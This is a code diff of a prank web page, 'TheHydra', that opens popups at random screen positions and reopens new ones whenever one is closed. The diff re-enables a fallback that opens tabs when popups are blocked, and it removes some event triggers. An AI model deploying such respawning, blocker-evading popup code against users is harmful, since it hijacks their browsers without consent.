@@ -13,47 +13,10 @@
     <link rel='shortcut icon' href='./favicon.png'>
 </head>
 
-<body mouseover="init()" onclick="init()" onload="init()">
+<body onclick="init()">
     <iframe onload="init()" src="./" style="display: none;"></iframe>
-    <div class="icon" mouseover="init()" onclick="init()" onload="init()">We Are The Hydra. Cut Off A Head, Three More Appears.<br>Drag this into your bookmarks bar to get your Hydra pet: <a href="javascript:window.open('//minecraftpublisher.github.io/TheHydra');void(0);">TheHydra</a></div>
+    <div class="icon">We Are The Hydra. Cut Off A Head, Three More Appears.<br>Drag this into your bookmarks bar to get your Hydra pet: <a href="javascript:window.open('//minecraftpublisher.github.io/TheHydra');void(0);">TheHydra</a></div>
     <script>
-        (function() {
-  var hidden = "hidden";
-
-  // Standards:
-  if (hidden in document)
-    document.addEventListener("visibilitychange", onchange);
-  else if ((hidden = "mozHidden") in document)
-    document.addEventListener("mozvisibilitychange", onchange);
-  else if ((hidden = "webkitHidden") in document)
-    document.addEventListener("webkitvisibilitychange", onchange);
-  else if ((hidden = "msHidden") in document)
-    document.addEventListener("msvisibilitychange", onchange);
-  // IE 9 and lower:
-  else if ("onfocusin" in document)
-    document.onfocusin = document.onfocusout = onchange;
-  // All others:
-  else
-    window.onpageshow = window.onpagehide
-    = window.onfocus = window.onblur = onchange;
-
-  function onchange (evt) {
-    var v = "visible", h = "hidden",
-        evtMap = {
-          focus:v, focusin:v, pageshow:v, blur:h, focusout:h, pagehide:h
-        };
-
-    evt = evt || window.event;
-    if (evt.type in evtMap)
-      document.body.className = evtMap[evt.type]
-    else
-      init()
-  }
-
-  // set the initial state (but only if browser supports the Page Visibility API)
-  if( document[hidden] !== undefined )
-    onchange({type: document[hidden] ? "blur" : "focus"})
-})();
         
         window.clone = new URLSearchParams(window.location.search).get('popup') || 'main'
         
@@ -69,10 +32,10 @@
         function openNew(input) {
             // Main popup loader
             var popup = window.open(window.location.href + '?popup=' + input, '', 'top=' + Math.floor(Math.random() * screen.availHeight) + ',left=' + Math.floor(Math.random() * screen.availWidth) + ',width=350,height=250')
-            /* if(!newWin || newWin.closed || typeof newWin.closed=='undefined') {
+            if(!popup || popup.closed || typeof popup.closed=='undefined') {
                 // Produces tab versions until a popup is allowed.
                 popup = window.open(window.location.href + '?popup=safe', '_blank')
-            } */
+            }
             
             // Check if a popup is closed, And then load up a new set of heads if it is.
             var popupTick = setInterval(function () {
@@ -80,7 +43,7 @@
                     clearInterval(popupTick);
                     openNew('safe')
                 }
-            }, 100)
+            }, 500)
 
             return false
         }
